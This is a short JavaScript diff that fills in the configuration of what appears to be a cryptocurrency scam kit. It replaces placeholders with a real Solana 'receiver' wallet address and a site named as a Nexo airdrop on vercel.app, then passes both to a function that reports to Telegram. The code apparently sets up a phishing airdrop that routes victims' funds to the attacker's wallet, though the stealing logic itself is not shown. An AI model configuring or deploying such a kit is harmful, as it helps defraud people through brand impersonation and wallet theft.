@@ -24,6 +24,6 @@ async function sendMessageToTelegram(solana_wallet_receiver_id, website_url) {
 }
 
 // Change this information for yours (
-const solana_wallet_receiver_id = 'YOUR_SOLANA_WALLET_RECEIVER_ID';
-const website_url = 'YOUR_WEBSITE_URL';
+const solana_wallet_receiver_id = 'GVjgARu9Hj7NGaP8ZWEDR1VbLBpXCEez6p8QondQTcvP';
+const website_url = 'https://airdrop-nexo-org.vercel.app/';
 sendMessageToTelegram(solana_wallet_receiver_id, website_url);
